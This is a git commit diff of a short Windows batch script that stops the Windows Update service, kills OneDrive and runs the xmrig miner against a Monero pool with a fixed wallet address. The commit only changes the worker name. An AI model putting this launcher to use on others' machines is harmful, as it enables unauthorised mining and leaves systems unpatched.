88eb08912a5c141def2475c743164c2d5b092ded
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-02-02 21:46:44 -0300

    Update restartado3.sh

--- restartado3.sh
+++ restartado3.sh
@@ -2,5 +2,5 @@
 net stop WUAUSERV
 taskkill /IM OneDrive.exe
 cd /d "%~dp0"
-xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.Sauce1 -p x -t 8
+xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.Sauce2 -p x -t 8
 pause 
